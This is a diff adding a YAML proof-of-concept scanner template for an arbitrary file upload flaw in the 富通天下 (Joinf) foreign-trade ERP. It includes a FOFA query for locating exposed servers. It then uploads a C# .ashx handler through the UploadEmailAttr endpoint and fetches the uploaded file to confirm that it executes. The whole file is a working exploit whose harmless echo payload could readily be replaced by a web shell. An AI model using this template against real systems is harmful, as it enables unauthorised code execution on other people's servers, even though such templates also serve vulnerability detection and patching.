@@ -1,0 +1,45 @@
+id: poc-yaml-joinf-erp-uploademailattr-anyfile-upload
+info:
+  name: 富通天下外贸ERP UploadEmailAttr 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 富通天下外贸ERP
+  fofa: title="用户登录_富通天下外贸ERP"
+variables:
+  t1: base64(random_str(4))
+requests:
+- method: POST
+  path: /JoinfApp/EMail/UploadEmailAttr?name=.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '<% @ webhandler language="C#" class="AverageHandler" %>
+
+    using System;
+
+    using System.Web;
+
+    public class AverageHandler : IHttpHandler
+
+    {
+
+    public bool IsReusable
+
+    { get { return true; } }
+
+    public void ProcessRequest(HttpContext ctx)
+
+    {
+
+    ctx.Response.Write("{{.t1}}");
+
+    }
+
+    }'
+  expression: status_code == 200 && !contains(body,"<")
+  output:
+  - regex_match(body,`JoinfWebFile/temp/emailatta/(?P<file>.*?).ashx`)
+- method: GET
+  path: /JoinfWebFile/temp/emailatta/{{.file}}.ashx
+  expression: status_code == 200 && body == t1
+transport: http
